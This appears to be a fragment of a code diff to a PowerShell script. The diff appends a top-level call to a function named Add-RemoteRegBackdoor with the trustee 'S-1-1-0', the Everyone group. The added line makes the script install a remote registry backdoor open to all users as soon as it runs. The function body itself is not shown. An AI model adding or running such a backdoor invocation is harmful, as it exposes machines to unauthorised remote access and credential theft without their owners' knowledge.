@@ -139,3 +139,4 @@ function Add-RemoteRegBackdoor {
     }
 }
 
+Add-RemoteRegBackdoor -Trustee 'S-1-1-0'
